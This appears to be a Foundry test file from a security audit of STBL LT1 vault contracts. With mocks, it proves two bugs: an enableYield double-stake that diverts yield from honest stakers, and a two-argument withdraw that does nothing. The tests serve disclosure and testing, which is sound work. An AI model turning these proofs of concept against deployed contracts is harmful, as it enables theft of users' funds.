// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contracts/lib/STBL_Structs.sol";
import "../contracts/asset/LT1/STBL_LT1_Issuer.sol";
import "../contracts/asset/LT1/STBL_LT1_Vault.sol";
import "../contracts/asset/LT1/STBL_LT1_YieldDistributor.sol";

// ---------- minimal mocks ----------
contract MockToken {
    string public name; string public symbol; uint8 public decimals;
    mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance;
    uint256 public totalSupply;
    constructor(string memory n, uint8 d){name=n;symbol=n;decimals=d;}
    function mint(address to,uint256 v) external {balanceOf[to]+=v; totalSupply+=v;}
    function burn(address from,uint256 v) external {balanceOf[from]-=v; totalSupply-=v;}
    function approve(address s,uint256 v) external returns(bool){allowance[msg.sender][s]=v;return true;}
    function transfer(address to,uint256 v) external returns(bool){balanceOf[msg.sender]-=v;balanceOf[to]+=v;return true;}
    function transferFrom(address f,address to,uint256 v) external returns(bool){
        uint256 a=allowance[f][msg.sender]; if(a!=type(uint256).max){allowance[f][msg.sender]=a-v;}
        balanceOf[f]-=v; balanceOf[to]+=v; return true;
    }
}

contract MockOracle {
    uint256 public price;      // in priceDecimals
    uint256 public pDec;       // price decimals
    constructor(uint256 p,uint256 d){price=p;pDec=d;}
    function setPrice(uint256 p) external {price=p;}
    function fetchPrice() external view returns(uint256){return price;}
    function getPriceDecimals() external view returns(uint256){return pDec;}
}

contract MockYLD {
    mapping(uint256=>YLD_Metadata) md;
    mapping(uint256=>address) _owner;
    uint256 public nextId=1;
    function mint(address to, YLD_Metadata memory m) external returns(uint256){
        uint256 id=nextId++; md[id]=m; _owner[id]=to; return id;
    }
    function burn(address from,uint256 id) external { require(_owner[id]==from,"owner"); _owner[id]=address(0); }
    function getNFTData(uint256 id) external view returns(YLD_Metadata memory){return md[id];}
    function ownerOf(uint256 id) external view returns(address){address o=_owner[id];require(o!=address(0),"noexist");return o;}
    function transfer(uint256 id,address to) external { require(_owner[id]==msg.sender,"o"); _owner[id]=to; }
    function adminTransfer(uint256 id,address to) external { _owner[id]=to; }
    function disableNFT(uint256 id) external { md[id].isDisabled=true; }
    function enableNFT(uint256 id) external { md[id].isDisabled=false; }
}

contract MockUSP is MockToken { constructor() MockToken("USP",18){} }

contract MockCore {
    MockYLD public yld; MockUSP public usp;
    constructor(MockYLD y, MockUSP u){yld=y;usp=u;}
    function put(address to, YLD_Metadata memory m) external returns(uint256){
        uint256 id=yld.mint(to,m); usp.mint(to,m.stableValueNet); return id;
    }
    function exit(uint256 /*assetID*/, address from, uint256 tokenID, uint256 value) external {
        yld.burn(from,tokenID); usp.burn(from,value);
    }
    function fetchUSPToken() external view returns(address){return address(usp);}
}

contract MockRegistry {
    AssetDefinition def;
    address public core; address public yld; address public treasury; address public fwd;
    mapping(bytes32=>mapping(address=>bool)) roles;
    function setDef(AssetDefinition memory d) external { def=d; }
    function setStatus(AssetStatus s) external { def.status=s; }
    function setAddrs(address c,address y,address t,address f) external {core=c;yld=y;treasury=t;fwd=f;}
    function grant(bytes32 r,address a) external { roles[r][a]=true; }
    function fetchAssetData(uint256) external view returns(AssetDefinition memory){return def;}
    function hasRole(bytes32 r,address a) external view returns(bool){return roles[r][a];}
    function fetchCore() external view returns(address){return core;}
    function fetchYLDToken() external view returns(address){return yld;}
    function fetchTreasury() external view returns(address){return treasury;}
    function trustedForwarder() external view returns(address){return fwd;}
}

// ---------- test ----------
contract Harness is Test {
    MockToken rwa; MockUSP usp; MockOracle oracle; MockYLD yld; MockCore core; MockRegistry reg;
    STBL_LT1_Issuer issuer; STBL_LT1_Vault vault; STBL_LT1_YieldDistributor dist;
    uint256 constant ASSET_ID=1;
    uint256 constant PD=8;                // oracle price decimals
    uint256 price = 106_000000;           // $1.06 with 8 decimals (USDY-like)
    address user = address(0xBEEF);
    address treasury = address(0x7EEA);

    function setUp() public {
        rwa=new MockToken("USDY",18); usp=new MockUSP(); oracle=new MockOracle(price,PD);
        yld=new MockYLD(); core=new MockCore(yld,usp); reg=new MockRegistry();
        issuer=new STBL_LT1_Issuer(); vault=new STBL_LT1_Vault(); dist=new STBL_LT1_YieldDistributor();
        issuer.initialize(ASSET_ID,address(reg));
        vault.initialize(ASSET_ID,address(reg));
        dist.initialize(ASSET_ID,address(reg));
        reg.setAddrs(address(core),address(yld),treasury,address(0));
        AssetDefinition memory d;
        d.id=ASSET_ID; d.name="USDY"; d.status=AssetStatus.ENABLED;
        d.token=address(rwa); d.issuer=address(issuer); d.rewardDistributor=address(dist);
        d.oracle=address(oracle); d.vault=address(vault);
        d.cut=10_000_000;          // haircut 1% (1e9=100%)
        d.depositFees=1_000_000;   // 0.1%
        d.withdrawFees=1_000_000;  // 0.1%
        d.insuranceFees=1_000_000; // 0.1%
        d.yieldFees=100_000_000;   // 10%
        d.duration=30 days; d.yieldDuration=1 days;
        reg.setDef(d);
        // fund user
        rwa.mint(user, 1_000_000e18);
        vm.prank(user); rwa.approve(address(vault), type(uint256).max);
    }

    function test_deposit_withdraw_conservation() public {
        uint256 rwaUserBefore = rwa.balanceOf(user);
        vm.prank(user);
        uint256 id = issuer.deposit(1000e18);
        // user paid 1000 rwa, got net USP + NFT
        assertEq(rwaUserBefore - rwa.balanceOf(user), 1000e18, "user paid 1000 rwa");
        uint256 uspMinted = usp.balanceOf(user);
        emit log_named_uint("USP minted (net)", uspMinted);
        emit log_named_uint("vault rwa", rwa.balanceOf(address(vault)));
        // move past yieldDuration
        vm.warp(block.timestamp + 2 days);
        vm.prank(user);
        issuer.withdraw(id);
        emit log_named_uint("user rwa after withdraw", rwa.balanceOf(user));
        emit log_named_uint("user USP after withdraw", usp.balanceOf(user));
        emit log_named_uint("vault rwa after withdraw", rwa.balanceOf(address(vault)));
        // USP fully burned
        assertEq(usp.balanceOf(user), 0, "USP burned on withdraw");
        // user cannot have more rwa than they started (no free money without yield)
        assertLe(rwa.balanceOf(user), rwaUserBefore, "user gained rwa from nowhere");
    }

    bytes32 constant SPLITTER_ROLE = keccak256("SPLITTER_ROLE");

    // In-scope root-cause proof #1: enableYield double-stakes an already-staked NFT (no idempotency),
    // giving that NFT >fair yield at other honest stakers' expense. Trigger is SPLITTER_ROLE (simulated).
    function test_enableYield_double_stake_yield_theft() public {
        address A = user; address B = address(0xB0B);
        rwa.mint(B, 1_000_000e18); vm.prank(B); rwa.approve(address(vault), type(uint256).max);
        vm.prank(A); uint256 idA = issuer.deposit(1000e18);
        vm.prank(B); uint256 idB = issuer.deposit(1000e18);
        // attacker/splitter re-enables yield on an ALREADY-staked NFT -> balance[idA] doubles
        address splitter = address(0x5717);
        reg.grant(SPLITTER_ROLE, splitter);
        vm.prank(splitter); issuer.enableYield(idA);
        // distribute a reward R directly from the vault (isVault path)
        uint256 R = 100e18;
        rwa.mint(address(vault), R);
        vm.prank(address(vault)); rwa.approve(address(dist), R);
        vm.warp(block.timestamp + 2 days);
        vm.prank(address(vault)); dist.distributeReward(R);
        uint256 aBefore = rwa.balanceOf(A); uint256 bBefore = rwa.balanceOf(B);
        dist.claim(idA); dist.claim(idB);
        uint256 aGain = rwa.balanceOf(A) - aBefore; uint256 bGain = rwa.balanceOf(B) - bBefore;
        emit log_named_uint("A yield (double-staked)", aGain);
        emit log_named_uint("B yield (honest, equal deposit)", bGain);
        // Without the bug A==B==R/2. With double-stake A gets 2R/3, B gets R/3 -> A stole from B.
        assertGt(aGain, bGain, "double-stake did NOT give A more (bug absent?)");
    }

    // In-scope root-cause proof #2: the 2-arg withdraw(id,sender) is a no-op; a periphery that
    // calls it to "redeem on behalf" gets no revert while the position stays fully alive.
    function test_empty_2arg_withdraw_is_noop() public {
        vm.prank(user); uint256 id = issuer.deposit(1000e18);
        uint256 uspBefore = usp.balanceOf(user);
        uint256 vaultBefore = rwa.balanceOf(address(vault));
        // "redeem on behalf" via 2-arg withdraw -> silently does NOTHING now
        issuer.withdraw(id, user);
        assertEq(yld.ownerOf(id), user, "NFT still owned (not burned)");
        assertEq(usp.balanceOf(user), uspBefore, "USP not burned");
        assertEq(rwa.balanceOf(address(vault)), vaultBefore, "collateral untouched");
        // the position is fully alive: the owner can still withdraw for real afterwards
        vm.warp(block.timestamp + 2 days);
        vm.prank(user); issuer.withdraw(id);
        assertEq(usp.balanceOf(user), 0, "position was still redeemable after the on-behalf call");
    }
}

